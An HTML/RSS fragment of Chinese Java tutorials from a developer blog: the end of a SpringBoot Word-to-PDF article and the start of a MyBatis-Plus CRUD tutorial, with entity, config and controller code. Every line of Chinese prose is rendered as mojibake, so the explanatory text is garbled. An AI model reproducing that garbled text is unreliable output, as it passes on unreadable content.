    }
}
</code></pre>
<h3 data-id="heading-12">è½¬æ¢è®°å½•ï¼ˆå˜å½¢æ¡£æ¡ˆå®¤ï¼‰</h3>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Entity</span>
<span class="hljs-variable">@Table</span>(name = <span class="hljs-string">"conversion_records"</span>)
<span class="hljs-variable">@Data</span>
<span class="hljs-variable">@NoArgsConstructor</span>
<span class="hljs-variable">@AllArgsConstructor</span>
public class ConversionRecord {
    <span class="hljs-variable">@Id</span>
    <span class="hljs-variable">@GeneratedValue</span>(strategy = GenerationType.IDENTITY)
    private Long id;
    
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">originalFileName</span>;
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">pdfFileName</span>;
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">Long</span> <span class="hljs-selector-tag">originalSize</span>;
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">Long</span> <span class="hljs-selector-tag">pdfSize</span>;
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">LocalDateTime</span> <span class="hljs-selector-tag">conversionTime</span>;
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">status</span>;  <span class="hljs-comment">// SUCCESS, FAILED, PROCESSING</span>
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">errorMessage</span>;
    
    @<span class="hljs-selector-tag">PrePersist</span>
    <span class="hljs-selector-tag">protected</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">onCreate</span>() {
        <span class="hljs-selector-tag">conversionTime</span> = <span class="hljs-selector-tag">LocalDateTime</span><span class="hljs-selector-class">.now</span>();
    }
}

@<span class="hljs-selector-tag">Repository</span>
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">interface</span> <span class="hljs-selector-tag">ConversionRecordRepository</span> <span class="hljs-selector-tag">extends</span> <span class="hljs-selector-tag">JpaRepository</span>&lt;<span class="hljs-selector-tag">ConversionRecord</span>, <span class="hljs-selector-tag">Long</span>&gt; {
    <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">ConversionRecord</span>&gt; <span class="hljs-selector-tag">findByStatusOrderByConversionTimeDesc</span>(String status);
}
</code></pre>
<h2 data-id="heading-13">éƒ¨ç½²ä¸ä¼˜åŒ–å»ºè®®</h2>
<h3 data-id="heading-14">1. æ€§èƒ½ä¼˜åŒ–</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml æ·»åŠ </span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">tomcat:</span>
    <span class="hljs-attr">max-threads:</span> <span class="hljs-number">200</span>  <span class="hljs-comment"># å¢åŠ çº¿ç¨‹æ•°å¤„ç†å¹¶å‘è½¬æ¢</span>
    <span class="hljs-attr">min-spare-threads:</span> <span class="hljs-number">20</span>

<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">task:</span>
    <span class="hljs-attr">execution:</span>
      <span class="hljs-attr">pool:</span>
        <span class="hljs-attr">core-size:</span> <span class="hljs-number">10</span>  <span class="hljs-comment"># å¼‚æ­¥ä»»åŠ¡çº¿ç¨‹æ± </span>
        <span class="hljs-attr">max-size:</span> <span class="hljs-number">50</span>
</code></pre>
<h3 data-id="heading-15">2. å†…å­˜ç®¡ç†</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryWatcher</span> {
    
    <span class="hljs-meta">@Scheduled(fixedRate = 60000)</span>  <span class="hljs-comment">// æ¯åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitorMemory</span><span class="hljs-params">()</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">usedMemory</span> <span class="hljs-operator">=</span> Runtime.getRuntime().totalMemory() - 
                         Runtime.getRuntime().freeMemory();
        <span class="hljs-type">long</span> <span class="hljs-variable">maxMemory</span> <span class="hljs-operator">=</span> Runtime.getRuntime().maxMemory();
        
        <span class="hljs-type">double</span> <span class="hljs-variable">usagePercentage</span> <span class="hljs-operator">=</span> (<span class="hljs-type">double</span>) usedMemory / maxMemory * <span class="hljs-number">100</span>;
        
        <span class="hljs-keyword">if</span> (usagePercentage &gt; <span class="hljs-number">80</span>) {
            System.out.println(<span class="hljs-string">"å†…å­˜è­¦å‘Šï¼šä½¿ç”¨ç‡ "</span> + 
                String.format(<span class="hljs-string">"%.1f"</span>, usagePercentage) + <span class="hljs-string">"%"</span>);
            <span class="hljs-comment">// è§¦å‘åƒåœ¾å›æ”¶</span>
            System.gc();
        }
    }
}
</code></pre>
<h2 data-id="heading-16">æ€»ç»“ï¼šWordè½¬PDFçš„å¥‡å¹»æ—…ç¨‹ç»ˆç‚¹ç«™</h2>
<p>ç»è¿‡è¿™ä¸€ç•ªæŠ˜è…¾ï¼Œæˆ‘ä»¬æˆåŠŸæ‰“é€ äº†ä¸€ä¸ª<strong>SpringBootç‰Œæ–‡æ¡£å˜å½¢é‡‘åˆš</strong>ï¼æ€»ç»“ä¸€ä¸‹è¿™åœºå†’é™©ï¼š</p>
<h3 data-id="heading-17">æˆ‘ä»¬å®ç°äº†ä»€ä¹ˆï¼š</h3>
<ol>
<li><strong>æ ¼å¼é©¯åŒ–</strong>ï¼šæŠŠè‡ªç”±çš„Wordå˜æˆè§„çŸ©çš„PDF</li>
<li><strong>å¼‚æ­¥å¤„ç†</strong>ï¼šå¤§æ–‡ä»¶è½¬æ¢ä¸å¡ç•Œé¢</li>
<li><strong>è¿›åº¦ç›‘æ§</strong>ï¼šå®æ—¶æŸ¥çœ‹è½¬æ¢è¿›åº¦</li>
<li><strong>é”™è¯¯å¤„ç†</strong>ï¼šä¼˜é›…å¤„ç†å„ç§æ„å¤–æƒ…å†µ</li>
<li><strong>æ‰¹é‡æ“ä½œ</strong>ï¼šä¸€æ¬¡æ€§é©¯åŒ–æ•´ä¸ªWordæ–‡æ¡£å®¶æ—</li>
</ol>
<h3 data-id="heading-18">æ³¨æ„äº‹é¡¹ï¼š</h3>
<ol>
<li><strong>å­—ä½“é—®é¢˜</strong>ï¼šæœ‰äº›ç‰¹æ®Šå­—ä½“PDFå¯èƒ½ä¸è®¤è¯†ï¼Œéœ€è¦é¢å¤–å¤„ç†</li>
<li><strong>å¤æ‚æ ¼å¼</strong>ï¼šWordé‡Œçš„é«˜çº§æ’ç‰ˆï¼ˆå¦‚æ–‡æœ¬æ¡†ã€è‰ºæœ¯å­—ï¼‰å¯èƒ½å˜å½¢</li>
<li><strong>å†…å­˜æ¶ˆè€—</strong>ï¼šå¤§æ–‡æ¡£è½¬æ¢æ—¶æ³¨æ„å†…å­˜æº¢å‡º</li>
<li><strong>å¹¶å‘é™åˆ¶</strong>ï¼šåŒæ—¶è½¬æ¢å¤ªå¤šæ–‡æ¡£å¯èƒ½å¯¼è‡´æœåŠ¡å™¨å–˜ä¸è¿‡æ°”</li>
</ol>
<p>Wordè½¬PDFå°±åƒç»™æ–‡æ¡£ç©¿ä¸Šâ€œé˜²æ”¹é“ ç”²â€ï¼ŒSpringBootå°±æ˜¯æˆ‘ä»¬æ‰“é€ è¿™å‰¯é“ ç”²çš„æ™ºèƒ½å·¥å‚ã€‚è™½ç„¶è¿‡ç¨‹ä¸­ä¼šé‡åˆ°å„ç§å¥‡è‘©æ ¼å¼çš„â€œåˆºå¤´æ–‡æ¡£â€ï¼Œä½†åªè¦æœ‰è€å¿ƒè°ƒè¯•ï¼Œæœ€ç»ˆéƒ½èƒ½æŠŠå®ƒä»¬æ²»ç†å¾—æœæœå¸–å¸–ï¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3131e8e3e124b91afd66148721634fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665866&amp;x-signature=2mnwm4puxTRh%2Bf5b5QCKh6UGPUs%3D" alt="æ–‡æ¡£å˜å½¢è®°ï¼ŒSpringBootå®æˆ˜ï¼Œ3æ­¥è®©Wordä¹–ä¹–å˜PDF.png" loading="lazy"/></p>
<p><strong>è°¢è°¢ä½ çœ‹æˆ‘çš„æ–‡ç« ï¼Œæ—¢ç„¶çœ‹åˆ°è¿™é‡Œäº†ï¼Œå¦‚æœè§‰å¾—ä¸é”™ï¼Œéšæ‰‹ç‚¹ä¸ªèµã€è½¬å‘ã€åœ¨çœ‹ä¸‰è¿å§ï¼Œæ„Ÿè°¢æ„Ÿè°¢ã€‚é‚£æˆ‘ä»¬ï¼Œä¸‹æ¬¡å†è§ã€‚</strong></p>
<p>æ‚¨çš„ä¸€é”®ä¸‰è¿ï¼Œæ˜¯æˆ‘æ›´æ–°çš„æœ€å¤§åŠ¨åŠ›ï¼Œè°¢è°¢</p>
<p>å±±æ°´æœ‰ç›¸é€¢ï¼Œæ¥æ—¥çš†å¯æœŸï¼Œè°¢è°¢é˜…è¯»ï¼Œæˆ‘ä»¬å†ä¼š</p>
<p>æˆ‘æ‰‹ä¸­çš„é‡‘ç®æ£’ï¼Œä¸Šèƒ½é€šå¤©ï¼Œä¸‹èƒ½æ¢æµ·</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[èƒ½çœäº‹â€ã€‚SpringBoot+MyBatis-Plusï¼šå¼€å‘æ•ˆç‡æå‡10å€ï¼]]></title>    <link>https://juejin.cn/post/7589181008098705423</link>    <guid>https://juejin.cn/post/7589181008098705423</guid>    <pubDate>2025-12-30T02:16:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589181008098705423" data-draft-id="7589206614929195048" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="èƒ½çœäº‹â€ã€‚SpringBoot+MyBatis-Plusï¼šå¼€å‘æ•ˆç‡æå‡10å€ï¼"/> <meta itemprop="keywords" content="MyBatis,Spring Boot,Java"/> <meta itemprop="datePublished" content="2025-12-30T02:16:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°åè¯´Java"/> <meta itemprop="url" content="https://juejin.cn/user/3898184413750203"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            èƒ½çœäº‹â€ã€‚SpringBoot+MyBatis-Plusï¼šå¼€å‘æ•ˆç‡æå‡10å€ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3898184413750203/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°åè¯´Java
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:16:35.000Z" title="Tue Dec 30 2025 02:16:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ã€Šèƒ½çœäº‹â€ã€‚SpringBoot+MyBatis-Plusï¼šå¼€å‘æ•ˆç‡æå‡10å€ï¼ã€‹</h2>
<blockquote>
<p>æˆ‘æ˜¯å°åï¼Œä»Šå¤©å’±ä»¬èŠç‚¹å®åœ¨çš„ã€‚ä½ è¿˜åœ¨æ‰‹å†™å¢åˆ æ”¹æŸ¥å—ï¼Ÿè¿˜åœ¨å†™é‚£äº›é‡å¤çš„Mapper XMLå—ï¼Ÿè¿˜åœ¨ä¸ºåˆ†é¡µå¤´ç–¼å—ï¼Ÿè¯•è¯•MyBatis-Plusï¼Œè®©ä½ å°‘å†™80%çš„ä»£ç ï¼</p>
</blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€å¼€å‘è€…çš„çœŸå®ç—›ç‚¹</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<p><strong>çœ‹çœ‹è¿™äº›åœºæ™¯ä½ ç†Ÿä¸ç†Ÿ</strong>ï¼š</p>
<p><strong>åœºæ™¯1</strong>ï¼šæ–°é¡¹ç›®å¼€å§‹ï¼Œå»ºè¡¨ã€å»ºå®ä½“ã€å»ºMapperã€å»ºServiceã€å»ºController...ä¸€å¥—ä¸‹æ¥å‡ åä¸ªæ–‡ä»¶ã€‚</p>
<p><strong>åœºæ™¯2</strong>ï¼šå†™ä¸ªæ¡ä»¶æŸ¥è¯¢ï¼ŒXMLé‡Œå†™ä¸€å †ifæ ‡ç­¾ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"findUsers"</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">"User"</span>&gt;</span>
    SELECT * FROM user WHERE 1=1
    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">"name != null"</span>&gt;</span>AND name like #{name}<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">"age != null"</span>&gt;</span>AND age = #{age}<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">"status != null"</span>&gt;</span>AND status = #{status}<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
</code></pre>
<p><strong>åœºæ™¯3</strong>ï¼šåˆ†é¡µæŸ¥è¯¢ï¼Œæ¯å†™ä¸€æ¬¡éƒ½è¦ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ‰‹å†™åˆ†é¡µSQL</span>
<span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SELECT * FROM user LIMIT "</span> + (page-<span class="hljs-number">1</span>)*size + <span class="hljs-string">","</span> + size;
<span class="hljs-comment">// å†æŸ¥æ€»æ•°</span>
<span class="hljs-type">String</span> <span class="hljs-variable">countSql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SELECT COUNT(*) FROM user"</span>;
</code></pre>
<p><strong>ç”¨MyBatis-Plusèƒ½è§£å†³å•¥</strong>ï¼š</p>
<ul>
<li>è‡ªåŠ¨ç”ŸæˆåŸºç¡€ä»£ç </li>
<li>æ¡ä»¶æŸ¥è¯¢ä¸ç”¨å†™XML</li>
<li>åˆ†é¡µä¸€è¡Œä»£ç æå®š</li>
<li>å†…ç½®é€»è¾‘åˆ é™¤ã€å­—æ®µå¡«å……</li>
<li>æ”¯æŒå¤šç§Ÿæˆ·æ•°æ®éš”ç¦»</li>
</ul>
<h3 data-id="heading-2">äºŒã€3åˆ†é’Ÿå¿«é€Ÿä¸Šæ‰‹</h3>
<h4 data-id="heading-3">2.1 åŠ ä¸ªä¾èµ–</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h4 data-id="heading-4">2.2 å†™ä¸ªé…ç½®</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml</span>
<span class="hljs-attr">mybatis-plus:</span>
  <span class="hljs-attr">configuration:</span>
    <span class="hljs-attr">log-impl:</span> <span class="hljs-string">org.apache.ibatis.logging.stdout.StdOutImpl</span>  <span class="hljs-comment"># æ‰“å°SQLæ—¥å¿—</span>
  <span class="hljs-attr">global-config:</span>
    <span class="hljs-attr">db-config:</span>
      <span class="hljs-attr">logic-delete-field:</span> <span class="hljs-string">deleted</span>  <span class="hljs-comment"># å…¨å±€é€»è¾‘åˆ é™¤å­—æ®µå</span>
      <span class="hljs-attr">logic-delete-value:</span> <span class="hljs-number">1</span>        <span class="hljs-comment"># é€»è¾‘å·²åˆ é™¤å€¼</span>
      <span class="hljs-attr">logic-not-delete-value:</span> <span class="hljs-number">0</span>    <span class="hljs-comment"># é€»è¾‘æœªåˆ é™¤å€¼</span>
</code></pre>
<h4 data-id="heading-5">2.3 å®šä¹‰å®ä½“</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Data</span>
<span class="hljs-meta">@TableName("user")</span>  <span class="hljs-comment">// æŒ‡å®šè¡¨å</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-meta">@TableId(type = IdType.AUTO)</span>  <span class="hljs-comment">// ä¸»é”®è‡ªå¢</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> Integer age;
    <span class="hljs-keyword">private</span> String email;
    
    <span class="hljs-meta">@TableLogic</span>  <span class="hljs-comment">// é€»è¾‘åˆ é™¤å­—æ®µ</span>
    <span class="hljs-keyword">private</span> Integer deleted;
    
    <span class="hljs-meta">@TableField(fill = FieldFill.INSERT)</span>  <span class="hljs-comment">// æ’å…¥æ—¶è‡ªåŠ¨å¡«å……</span>
    <span class="hljs-keyword">private</span> LocalDateTime createTime;
    
    <span class="hljs-meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span>  <span class="hljs-comment">// æ’å…¥å’Œæ›´æ–°æ—¶å¡«å……</span>
    <span class="hljs-keyword">private</span> LocalDateTime updateTime;
}
</code></pre>
<h4 data-id="heading-6">2.4 å†™ä¸ªMapperï¼ˆæœ€ç®€å•ç‰ˆï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseMapper</span>&lt;User&gt; {
    <span class="hljs-comment">// ç»§æ‰¿BaseMapperå°±æœ‰äº†æ‰€æœ‰åŸºç¡€CRUDæ–¹æ³•</span>
    <span class="hljs-comment">// ä¸ç”¨å†™XMLï¼Œä¸ç”¨å†™SQL</span>
}
</code></pre>
<h4 data-id="heading-7">2.5 é©¬ä¸Šå°±èƒ½ç”¨</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/users")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserMapper userMapper;
    
    <span class="hljs-meta">@GetMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-comment">// ç›´æ¥æŸ¥è¯¢</span>
        <span class="hljs-keyword">return</span> userMapper.selectById(id);
    }
    
    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addUser</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> User user)</span> {
        <span class="hljs-comment">// ç›´æ¥æ’å…¥</span>
        userMapper.insert(user);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"æ·»åŠ æˆåŠŸ"</span>;
    }
}
</code></pre>
<h3 data-id="heading-8">ä¸‰ã€æ ¸å¿ƒåŠŸèƒ½ï¼šè§£æ”¾ç”Ÿäº§åŠ›</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
